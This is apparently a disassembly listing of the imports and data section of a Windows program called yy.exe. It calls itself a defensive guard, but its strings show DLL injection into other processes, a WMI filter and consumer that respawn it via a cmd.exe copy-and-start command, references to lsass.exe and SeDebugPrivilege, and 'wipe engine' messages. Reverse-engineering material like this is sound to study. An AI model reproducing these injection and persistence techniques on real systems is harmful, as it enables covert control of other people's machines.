; HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID)
extrn CreateToolhelp32Snapshot:qword
; void (__stdcall *Sleep)(DWORD dwMilliseconds)
extrn Sleep:qword
; DWORD (__stdcall *GetLastError)()
extrn GetLastError:qword
; BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
extrn Process32NextW:qword
; LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2)
extrn lstrcatW:qword
; HANDLE (__stdcall *GetCurrentProcess)()
extrn GetCurrentProcess:qword
; BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
extrn Process32FirstW:qword
; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
extrn CloseHandle:qword
; HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
extrn CreateThread:qword
; BOOL (__stdcall *Module32FirstW)(HANDLE hSnapshot, LPMODULEENTRY32W lpme)
extrn Module32FirstW:qword
; void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime)
extrn GetLocalTime:qword
; PVOID (__stdcall *AddVectoredExceptionHandler)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler)
extrn AddVectoredExceptionHandler:qword
; FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
extrn GetProcAddress:qword
; LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
extrn VirtualAllocEx:qword
; DWORD (__stdcall *GetCurrentProcessId)()
extrn GetCurrentProcessId:qword
; BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
extrn CreateProcessW:qword
; HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName)
extrn GetModuleHandleW:qword
; BOOL (__stdcall *CopyFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists)
extrn CopyFileW:qword
; HANDLE (__stdcall *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
extrn CreateRemoteThread:qword
; BOOL (__stdcall *Module32NextW)(HANDLE hSnapshot, LPMODULEENTRY32W lpme)
extrn Module32NextW:qword
; BOOL (__stdcall *QueryFullProcessImageNameW)(HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, PDWORD lpdwSize)
extrn QueryFullProcessImageNameW:qword
; BOOL (__stdcall *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
extrn VirtualFreeEx:qword
; DWORD (__stdcall *GetTickCount)()
extrn GetTickCount:qword
; HANDLE (__stdcall *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
extrn OpenThread:qword
; void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection)
extrn EnterCriticalSection:qword
; LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
extrn SetUnhandledExceptionFilter:qword
; void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead)
extrn InitializeSListHead:qword
; void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime)
extrn GetSystemTimeAsFileTime:qword
; DWORD (__stdcall *GetCurrentThreadId)()
extrn GetCurrentThreadId:qword
; BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount)
extrn QueryPerformanceCounter:qword
; BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
extrn VirtualProtect:qword
; BOOL (__stdcall *DeleteFileW)(LPCWSTR lpFileName)
extrn DeleteFileW:qword
; BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
extrn WriteProcessMemory:qword

;
; Imports from MSVCP140.dll
;
; public: virtual std::basic_iostream<char, struct std::char_traits<char>>::~basic_iostream<char, struct std::char_traits<char>>(void)
extrn ??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ:qword
; public: bool std::ios_base::good(void)const
extrn ?good@ios_base@std@@QEBA_NXZ:qword
; __declspec(dllimport) protected: virtual void std::basic_streambuf<char, struct std::char_traits<char>>::imbue(class std::locale const &)
extrn __imp_?imbue@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAXAEBVlocale@2@@Z:qword
; __declspec(dllimport) protected: virtual int std::basic_streambuf<char, struct std::char_traits<char>>::sync(void)
extrn __imp_?sync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAHXZ:qword
; __declspec(dllimport) protected: virtual class std::basic_streambuf<char, struct std::char_traits<char>> * std::basic_streambuf<char, struct std::char_traits<char>>::setbuf(char *, __int64)
extrn __imp_?setbuf@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAPEAV12@PEAD_J@Z:qword
; public: class std::basic_ostream<char, struct std::char_traits<char>> & std::basic_ostream<char, struct std::char_traits<char>>::operator<<(unsigned short)
extrn ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@G@Z:qword
; __declspec(dllimport) protected: virtual __int64 std::basic_streambuf<char, struct std::char_traits<char>>::xsputn(char const *, __int64)
extrn __imp_?xsputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JPEBD_J@Z:qword
; __declspec(dllimport) protected: virtual __int64 std::basic_streambuf<char, struct std::char_traits<char>>::xsgetn(char *, __int64)
extrn __imp_?xsgetn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JPEAD_J@Z:qword
; __declspec(dllimport) protected: virtual int std::basic_streambuf<char, struct std::char_traits<char>>::uflow(void)
extrn __imp_?uflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAAHXZ:qword
; __declspec(dllimport) protected: virtual __int64 std::basic_streambuf<char, struct std::char_traits<char>>::showmanyc(void)
extrn __imp_?showmanyc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MEAA_JXZ:qword
; __declspec(dllimport) public: virtual void std::basic_streambuf<char, struct std::char_traits<char>>::_Unlock(void)
extrn __imp_?_Unlock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAAXXZ:qword
; __declspec(dllimport) public: virtual void std::basic_streambuf<char, struct std::char_traits<char>>::_Lock(void)
extrn __imp_?_Lock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAAXXZ:qword
; public: virtual std::basic_streambuf<char, struct std::char_traits<char>>::~basic_streambuf<char, struct std::char_traits<char>>(void)
extrn ??1?$basic_streambuf@DU?$char_traits@D@std@@@std@@UEAA@XZ:qword
; public: virtual std::basic_ios<char, struct std::char_traits<char>>::~basic_ios<char, struct std::char_traits<char>>(void)
extrn ??1?$basic_ios@DU?$char_traits@D@std@@@std@@UEAA@XZ:qword
; public: std::basic_iostream<char, struct std::char_traits<char>>::basic_iostream<char, struct std::char_traits<char>>(class std::basic_streambuf<char, struct std::char_traits<char>> *)
extrn ??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z:qword
; int std::uncaught_exceptions(void)
extrn ?uncaught_exceptions@std@@YAHXZ:qword
; class std::basic_ostream<char, struct std::char_traits<char>> std::cout
extrn ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:qword
; struct std::_Smanip<__int64> std::setw(__int64)
extrn ?setw@std@@YA?AU?$_Smanip@_J@1@_J@Z:qword
; void std::_Xlength_error(char const *)
extrn ?_Xlength_error@std@@YAXPEBD@Z:qword
; protected: std::basic_streambuf<char, struct std::char_traits<char>>::basic_streambuf<char, struct std::char_traits<char>>(void)
extrn ??0?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAA@XZ:qword
; public: void std::basic_ostream<char, struct std::char_traits<char>>::_Osfx(void)
extrn ?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ:qword
; public: class std::basic_ostream<char, struct std::char_traits<char>> & std::basic_ostream<char, struct std::char_traits<char>>::flush(void)
extrn ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ:qword
; public: void std::basic_ios<char, struct std::char_traits<char>>::setstate(int, bool)
extrn ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z:qword
; protected: std::basic_ios<char, struct std::char_traits<char>>::basic_ios<char, struct std::char_traits<char>>(void)
extrn ??0?$basic_ios@DU?$char_traits@D@std@@@std@@IEAA@XZ:qword
; public: int std::basic_streambuf<char, struct std::char_traits<char>>::sputc(char)
extrn ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z:qword
; public: __int64 std::basic_streambuf<char, struct std::char_traits<char>>::sputn(char const *, __int64)
extrn ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z:qword

;
; Imports from OLEAUT32.dll
;
; BSTR (__stdcall *SysAllocString)(const OLECHAR *psz)
extrn SysAllocString:qword ; Import by ordinal 2
; HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg)
extrn VariantClear:qword ; Import by ordinal 9
; void (__stdcall *VariantInit)(VARIANTARG *pvarg)
extrn VariantInit:qword ; Import by ordinal 8

;
; Imports from USER32.dll
;
; int (__stdcall *GetClassNameW)(HWND hWnd, LPWSTR lpClassName, int nMaxCount)
extrn GetClassNameW:qword
; int (__stdcall *GetWindowTextLengthA)(HWND hWnd)
extrn GetWindowTextLengthA:qword
; int (*wsprintfW)(LPWSTR, LPCWSTR, ...)
extrn wsprintfW:qword
; LRESULT (__stdcall *SendMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
extrn SendMessageA:qword
; HCURSOR (__stdcall *LoadCursorW)(HINSTANCE hInstance, LPCWSTR lpCursorName)
extrn LoadCursorW:qword
; DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId)
extrn GetWindowThreadProcessId:qword
; LRESULT (__stdcall *DefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
extrn DefWindowProcW:qword
; LRESULT (__stdcall *CallWindowProcW)(WNDPROC lpPrevWndFunc, HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
extrn CallWindowProcW:qword
; BOOL (__stdcall *IsWindowVisible)(HWND hWnd)
extrn IsWindowVisible:qword
; LONG_PTR (__stdcall *SetWindowLongPtrW)(HWND hWnd, int nIndex, LONG_PTR dwNewLong)
extrn SetWindowLongPtrW:qword
; HWND (__stdcall *CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
extrn CreateWindowExW:qword
; ATOM (__stdcall *RegisterClassExW)(const WNDCLASSEXW *)
extrn RegisterClassExW:qword
; BOOL (__stdcall *IsWindow)(HWND hWnd)
extrn IsWindow:qword
; LRESULT (__stdcall *DispatchMessageW)(const MSG *lpMsg)
extrn DispatchMessageW:qword
; BOOL (__stdcall *PeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
extrn PeekMessageW:qword
; BOOL (__stdcall *EnumWindows)(WNDENUMPROC lpEnumFunc, LPARAM lParam)
extrn EnumWindows:qword
; BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg)
extrn TranslateMessage:qword

;
; Imports from VCRUNTIME140.dll
;
extrn __std_exception_destroy:qword
extrn __std_exception_copy:qword
; wchar_t *(__cdecl *wcsstr)(const wchar_t *Str, const wchar_t *SubStr)
extrn wcsstr:qword
extrn __std_terminate:qword
; wchar_t *(__cdecl *wcsrchr)(const wchar_t *Str, wchar_t Ch)
extrn wcsrchr:qword
; EXCEPTION_DISPOSITION (__cdecl *__C_specific_handler)(struct _EXCEPTION_RECORD *ExceptionRecord, void *EstablisherFrame, struct _CONTEXT *ContextRecord, struct _DISPATCHER_CONTEXT *DispatcherContext)
extrn __imp___C_specific_handler:qword
; void (__stdcall __noreturn *_CxxThrowException)(void *pExceptionObject, _ThrowInfo *pThrowInfo)
extrn __imp__CxxThrowException:qword
; void *(__cdecl *memset)(void *, int Val, size_t Size)
extrn __imp_memset:qword
extrn __imp___current_exception:qword
extrn __imp___current_exception_context:qword
; void *(__cdecl *memmove)(void *, const void *Src, size_t Size)
extrn __imp_memmove:qword
; void *(__cdecl *memcpy)(void *, const void *Src, size_t Size)
extrn __imp_memcpy:qword

;
; Imports from VCRUNTIME140_1.dll
;
extrn __imp___CxxFrameHandler4:qword

;
; Imports from api-ms-win-crt-heap-l1-1-0.dll
;
; int (__cdecl *_callnewh)(size_t Size)
extrn __imp__callnewh:qword
; void *(__cdecl *malloc)(size_t Size)
extrn __imp_malloc:qword
; void (__cdecl *free)(void *Block)
extrn __imp_free:qword
; int (__cdecl *_set_new_mode)(int NewMode)
extrn __imp__set_new_mode:qword

;
; Imports from api-ms-win-crt-locale-l1-1-0.dll
;
; int (__cdecl *_configthreadlocale)(int Flag)
extrn __imp__configthreadlocale:qword

;
; Imports from api-ms-win-crt-math-l1-1-0.dll
;
; void (__cdecl *__setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction)
extrn __imp___setusermatherr:qword

;
; Imports from api-ms-win-crt-runtime-l1-1-0.dll
;
; void (__cdecl *_initterm)(_PVFV *First, _PVFV *Last)
extrn __imp__initterm:qword
; int (__cdecl *_initterm_e)(_PIFV *First, _PIFV *Last)
extrn __imp__initterm_e:qword
; void (__cdecl __noreturn *exit)(int Code)
extrn __imp_exit:qword
; void (__cdecl __noreturn *_exit)(int Code)
extrn __imp__exit:qword
; char **(__cdecl *_get_initial_narrow_environment)()
extrn __imp__get_initial_narrow_environment:qword
; int *(__cdecl *__p___argc)()
extrn __imp___p___argc:qword
; char ***(__cdecl *__p___argv)()
extrn __imp___p___argv:qword
; void (__cdecl *_cexit)()
extrn __imp__cexit:qword
; void (__cdecl *_c_exit)()
extrn __imp__c_exit:qword
; void (__cdecl *_register_thread_local_exe_atexit_callback)(_tls_callback_type Callback)
extrn __imp__register_thread_local_exe_atexit_callback:qword
; errno_t (__cdecl *_configure_narrow_argv)(_crt_argv_mode mode)
extrn __imp__configure_narrow_argv:qword
; int (__cdecl *_seh_filter_exe)(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)
extrn __imp__seh_filter_exe:qword
; int (__cdecl *_initialize_narrow_environment)()
extrn __imp__initialize_narrow_environment:qword
; int (__cdecl *_initialize_onexit_table)(_onexit_table_t *Table)
extrn __imp__initialize_onexit_table:qword
; int (__cdecl *_register_onexit_function)(_onexit_table_t *Table, _onexit_t Function)
extrn __imp__register_onexit_function:qword
; int (__cdecl *_crt_atexit)(_PVFV Function)
extrn __imp__crt_atexit:qword
extrn __imp_terminate:qword
; void (__cdecl *_set_app_type)(_crt_app_type Type)
extrn __imp__set_app_type:qword

;
; Imports from api-ms-win-crt-stdio-l1-1-0.dll
;
; errno_t (__cdecl *_set_fmode)(int Mode)
extrn __imp__set_fmode:qword
; int *(__cdecl *__p__commode)()
extrn __imp___p__commode:qword
; int (__cdecl *_stdio_common_vswprintf_s)(unsigned __int64 Options, wchar_t *Buffer, size_t BufferCount, const wchar_t *Format, _locale_t Locale, va_list ArgList)
extrn __stdio_common_vswprintf_s:qword

;
; Imports from api-ms-win-crt-string-l1-1-0.dll
;
; wint_t (__cdecl *towupper)(wint_t C)
extrn towupper:qword
; errno_t (__cdecl *wcscat_s)(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)
extrn wcscat_s:qword
; errno_t (__cdecl *wcscpy_s)(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)
extrn wcscpy_s:qword
; size_t (__cdecl *strlen)(const char *Str)
extrn __imp_strlen:qword
; size_t (__cdecl *wcslen)(const wchar_t *String)
extrn __imp_wcslen:qword

;
; Imports from ole32.dll
;
; HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit)
extrn CoInitializeEx:qword
; HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv)
extrn CoCreateInstance:qword
; HRESULT (__stdcall *CoSetProxyBlanket)(IUnknown *pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR *pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities)
extrn CoSetProxyBlanket:qword
; void (__stdcall *CoUninitialize)()
extrn CoUninitialize:qword



; Segment type: Pure data
; Segment permissions: Read
_rdata segment para public 'DATA' use64
assume cs:_rdata
;org 140008520h
__guard_check_icall_fptr dq offset _guard_check_icall_nop
__guard_xfg_check_icall_fptr dq offset _guard_check_icall_nop
__guard_dispatch_icall_fptr dq offset _guard_dispatch_icall_nop
__guard_xfg_dispatch_icall_fptr dq offset _guard_xfg_dispatch_icall_nop
__guard_xfg_table_dispatch_icall_fptr dq offset _guard_xfg_dispatch_icall_nop
__castguard_check_failure_os_handled_fptr db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
off_140008550 dq offset memcpy
; const _PVFV qword_140008558
qword_140008558 dq 0
dq offset sub_140006440
; const _PVFV qword_140008568
qword_140008568 dq 0
; const _PIFV First
First dq 0
dq offset sub_140006370
dq offset sub_140006430
; const _PIFV Last
Last dq 0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
; const IID riid
riid dd 0DC12A687h           ; Data1
dw 737Fh                ; Data2
dw 11CFh                ; Data3
db 88h, 4Dh, 0, 0AAh, 0, 4Bh, 2Eh, 24h; Data4
; const IID rclsid
rclsid dd 4590F811h            ; Data1
dw 1D3Ah                ; Data2
dw 11D0h                ; Data3
db 89h, 1Fh, 0, 0AAh, 0, 4Bh, 2Eh, 24h; Data4
dq offset ??_R4type_info@@6B@ ; const type_info::`RTTI Complete Object Locator'
; const type_info::`vftable'
??_7type_info@@6B@ dq offset sub_140006340
dq offset ??_R4exception@std@@6B@ ; const std::exception::`RTTI Complete Object Locator'
; const std::exception::`vftable'
??_7exception@std@@6B@ dq offset sub_1400010D0
dq offset sub_1400010B0
dq offset ??_R4bad_alloc@std@@6B@ ; const std::bad_alloc::`RTTI Complete Object Locator'
; const std::bad_alloc::`vftable'
??_7bad_alloc@std@@6B@ dq offset sub_1400010D0
dq offset sub_1400010B0
aBadAllocation db 'bad allocation',0
align 20h
dq offset ??_R4bad_array_new_length@std@@6B@ ; const std::bad_array_new_length::`RTTI Complete Object Locator'
; const std::bad_array_new_length::`vftable'
??_7bad_array_new_length@std@@6B@ dq offset sub_1400010D0
dq offset sub_1400010B0
align 20h
xmmword_140008640 xmmword 0FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFh
aUnknownExcepti db 'Unknown exception',0
align 8
aBadArrayNewLen db 'bad array new length',0
align 20h
aStringTooLong db 'string too long',0
; const WCHAR WindowName
WindowName:
text "UTF-16LE", 'YY_Defensive_GUI',0
align 8
; const wchar_t SubStr
SubStr:
text "UTF-16LE", 'yyguard.dll',0
; const WCHAR String2
String2:
text "UTF-16LE", 'lenovo_fix.exe',0
align 10h
aSvcguardDll:
text "UTF-16LE", 'svcguard.dll',0
align 10h
aWindowDll:
text "UTF-16LE", 'window.dll',0
align 8
aAtkcoreDll:
text "UTF-16LE", 'atkcore.dll',0
aPayloadDll:
text "UTF-16LE", 'payload.dll',0
aDefenseDll:
text "UTF-16LE", 'defense.dll',0
aDeamonwindowsD:
text "UTF-16LE", 'DeamonWindows.dll',0
align 8
aDeamonDll:
text "UTF-16LE", 'deamon.dll',0
align 10h
aLsassExe:
text "UTF-16LE", 'lsass.exe',0
align 8
aBootrepair:
text "UTF-16LE", '\\.\BootRepair',0
align 8
aKdmapper:
text "UTF-16LE", '\\.\kdmapper',0
align 8
aKdu:
text "UTF-16LE", '\\.\kdu',0
aGio:
text "UTF-16LE", '\\.\GIO',0
asc_140008828 db 0Dh,0Ah,0
align 4
asc_14000882C db '] ',0
align 10h
asc_140008830 db '-',0
align 4
asc_140008834 db '[',0
align 8
aRootCi:
text "UTF-16LE", 'ROOT\CI'
qword_140008846 dq 320056004Dh
align 10h
xmmword_140008850 xmmword 460074006E006500760045005F005Fh
xmmword_140008860 xmmword 61004E002E007200650074006C0069h
xmmword_140008870 xmmword 52005F005800580022003D0065006Dh
xmmword_140008880 xmmword 690046006E00770061007000730065h
aLter:
text "UTF-16LE", 'lter"',0
align 20h
xmmword_1400088A0 xmmword 4C0064006E0061006D006D006F0043h
xmmword_1400088B0 xmmword 74006E0065007600450065006E0069h
xmmword_1400088C0 xmmword 720065006D00750073006E006F0043h
xmmword_1400088D0 xmmword 580022003D0065006D0061004E002Eh
xmmword_1400088E0 xmmword 7700610070007300650052005F0058h
aNconsum:
text "UTF-16LE", 'nConsum'
qword_1400088FE dq 2200720065h
align 8
xmmword_140008908 xmmword 460074006E006500760045005F005Fh
aIlter:
text "UTF-16LE", 'ilter',0
align 8
xmmword_140008928 xmmword 4C0064006E0061006D006D006F0043h
xmmword_140008938 xmmword 74006E0065007600450065006E0069h
xmmword_140008948 xmmword 720065006D00750073006E006F0043h
word_140008958 dw 0
align 20h
xmmword_140008960 xmmword 7200650074006C00690046005F005Fh
xmmword_140008970 xmmword 6D00750073006E006F0043006F0054h
xmmword_140008980 xmmword 6E00690064006E0069004200720065h
dword_140008990 dd 67h
align 8
; const wchar_t Source
Source:
text "UTF-16LE", 'yyres.bin',0
align 10h
; const wchar_t aCmdExeCIfNotEx
aCmdExeCIfNotEx:
text "UTF-16LE", 'cmd.exe /c if not exi'
text "UTF-16LE", 'st "%s" copy /y "%s" '
text "UTF-16LE", '"%s" & start "" "%s"',0
align 10h
; const OLECHAR psz
psz:
text "UTF-16LE", 'YY_RespawnFilter',0
align 8
aName:
text "UTF-16LE", 'Name',0
align 8
; const OLECHAR aWql
aWql:
text "UTF-16LE", 'WQL',0
aQuerylanguage:
text "UTF-16LE", 'QueryLanguage',0
align 10h
; const OLECHAR aRootCimv2
aRootCimv2:
text "UTF-16LE", 'root\cimv2',0
align 8
aEventnamespace:
text "UTF-16LE", 'EventNamespace',0
align 10h
; const OLECHAR aSelectFromInst
aSelectFromInst:
text "UTF-16LE", 'SELECT * FROM __Insta'
text "UTF-16LE", 'nceDeletionEvent WITH'
text "UTF-16LE", 'IN 1 WHERE TargetInst'
text "UTF-16LE", 'ance ISA ',27h,'Win32'
text "UTF-16LE", '_Process',27h,' AND T'
text "UTF-16LE", 'argetInstance.Name = '
text "UTF-16LE", 27h,'yy.exe',27h,0
align 8
aQuery:
text "UTF-16LE", 'Query',0
align 8
; const OLECHAR aYyRespawnconsu
aYyRespawnconsu:
text "UTF-16LE", 'YY_RespawnConsumer',0
align 20h
aCommandlinetem:
text "UTF-16LE", 'CommandLineTemplate',0
align 10h
; const OLECHAR aEventfilterNam
aEventfilterNam:
text "UTF-16LE", '__EventFilter.Name="Y'
text "UTF-16LE", 'Y_RespawnFilter"',0
align 20h
aFilter:
text "UTF-16LE", 'Filter',0
align 10h
; const OLECHAR aCommandlineeve
aCommandlineeve:
text "UTF-16LE", 'CommandLineEventConsu'
text "UTF-16LE", 'mer.Name="YY_RespawnC'
text "UTF-16LE", 'onsumer"',0
align 8
aConsumer:
text "UTF-16LE", 'Consumer',0
align 10h
; const wchar_t aYyBackup7f3a9c
aYyBackup7f3a9c:
text "UTF-16LE", 'yy_backup_7f3a9c1e.da'
text "UTF-16LE", 't',0
align 20h
xmmword_140008D40 xmmword 76657250203A646C65696853204C4C44h
xmmword_140008D50 xmmword 2073756F6963696C616D206465746E65h
xmmword_140008D60 xmmword 61747461206D6F726620726564616F6Ch
xmmword_140008D70 xmmword 73746E656E6F706D6F6320676E696863h
byte_140008D80 db 2Eh
align 8
; const CHAR ModuleName[]
ModuleName db 'ntdll.dll',0
align 8
; const CHAR ProcName[]
ProcName db 'LdrLoadDll',0
align 8
xmmword_140008DA8 xmmword 6D617274203A646C65696853204C4C44h
xmmword_140008DB8 xmmword 69616620646C69756220656E696C6F70h
dword_140008DC8 dd 2E64656Ch
align 10h
xmmword_140008DD0 xmmword 6B6F6F68203A646C65696853204C4C44h
xmmword_140008DE0 xmmword 2E64656C696166206C6C6174736E6920h
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
xmmword_140008DF8 xmmword 6D617254203A646C65696853204C4C44h
xmmword_140008E08 xmmword 61206465676469726220656E696C6F70h
xmmword_140008E18 xmmword 4464616F4C72644C216C6C64746E2074h
db  6Ch ; l
db  6Ch ; l
db  2Eh ; .
db    0
db    0
db    0
db    0
db    0
; const CHAR aKernel32Dll_0[]
aKernel32Dll_0 db 'kernel32.dll',0
align 20h
; const CHAR aTerminateproce[]
aTerminateproce db 'TerminateProcess',0
align 8
; const WCHAR Name
Name:
text "UTF-16LE", 'SeDebugPrivilege',0
align 4
aXx:
text "UTF-16LE", 'xx',0
align 8
aSystem:
text "UTF-16LE", 'System',0
align 8
aSmssExe:
text "UTF-16LE", 'smss.exe',0
align 10h
aCsrssExe:
text "UTF-16LE", 'csrss.exe',0
align 8
aWininitExe:
text "UTF-16LE", 'wininit.exe',0
aServicesExe:
text "UTF-16LE", 'services.exe',0
align 20h
aWinlogonExe:
text "UTF-16LE", 'winlogon.exe',0
align 20h
aSpoolsvExe:
text "UTF-16LE", 'spoolsv.exe',0
aDwmExe:
text "UTF-16LE", 'dwm.exe',0
aTaskhostExe:
text "UTF-16LE", 'taskhost.exe',0
align 8
; const CHAR aLoadlibraryw[]
aLoadlibraryw db 'LoadLibraryW',0
align 8
aProcs db ' procs.',0
aSpreadYyguardD db 'Spread: yyguard.dll injected into ',0
align 8
; const WCHAR aS
aS:
text "UTF-16LE", '"%s"',0
align 8
xmmword_140008FB8 xmmword 6564207469614220746F7079656E6F48h
xmmword_140008FC8 xmmword 6E6920796C65666173206465796F6C70h
xmmword_140008FD8 xmmword 2E656E6F7A206E6F6974616C6F736920h
align 10h
; const wchar_t aXxAliveWnd
aXxAliveWnd:
text "UTF-16LE", 'XX_ALIVE_WND_',0
align 10h
; const CHAR aNtsuspendproce[]
aNtsuspendproce db 'NtSuspendProcess',0
align 8
; const CHAR aNtsuspendthrea[]
aNtsuspendthrea db 'NtSuspendThread',0
; const CHAR aNtquerysystemi[]
aNtquerysystemi db 'NtQuerySystemInformation',0
align 8
; const wchar_t aXxresBin
aXxresBin:
text "UTF-16LE", 'xxres.bin',0
align 10h
xmmword_140009070 xmmword 736944203A656E69676E452065706957h
xmmword_140009080 xmmword 202E7465677261742064657265766F63h
xmmword_140009090 xmmword 6B636F6C206D657473797320656C6946h
aEdAndCleared db 'ed and cleared.',0
xmmword_1400090B0 xmmword 6C65696853204845562078697274614Dh
xmmword_1400090C0 xmmword 78302064657265766F63736944203A64h
xmmword_1400090D0 xmmword 74706D65747461206863746170204343h
aSelfHealed db '! Self-healed.',0
align 10h
aText db '.text',0
align 8
; const WCHAR ClassName
ClassName:
text "UTF-16LE", 'YYWnd_7f3a9c1e',0
align 8
; const WCHAR word_140009118
word_140009118 dw 0
align 20h
; const WCHAR aEdit
aEdit:
text "UTF-16LE", 'EDIT',0
align 10h
; const wchar_t aCYyDebugLog
aCYyDebugLog:
text "UTF-16LE", 'C:\yy_debug.log',0
; const wchar_t aYyDebugLog
aYyDebugLog:
text "UTF-16LE", 'yy_debug.log',0
align 10h
; const wchar_t Format
Format:
text "UTF-16LE", '[%lu] %s',0Dh,0Ah,0
align 8
aYyExeMainStart:
text "UTF-16LE", 'yy.exe main started',0
xmmword_1400091B0 xmmword 634120646C65696853206D6574737953h
xmmword_1400091C0 xmmword 656E696C6F706D617254202E65766974h
xmmword_1400091D0 xmmword 6974696E69206E6F6974616C6F736920h
aAlized db 'alized.',0
; const wchar_t aYyHbTmp
aYyHbTmp:
text "UTF-16LE", 'yy_hb.tmp',0
align 20h
; const LPCWSTR lpFileName
lpFileName dq offset aBootrepair ; "\\\\.\\BootRepair"
; const LPCWSTR off_140009208
off_140009208 dq offset aKdmapper ; "\\\\.\\kdmapper"
; const LPCWSTR off_140009210
off_140009210 dq offset aKdu ; "\\\\.\\kdu"
; const LPCWSTR off_140009218
off_140009218 dq offset aGio ; "\\\\.\\GIO"
dq offset WindowName    ; "YY_Defensive_GUI"
; const LPCWSTR lpString2
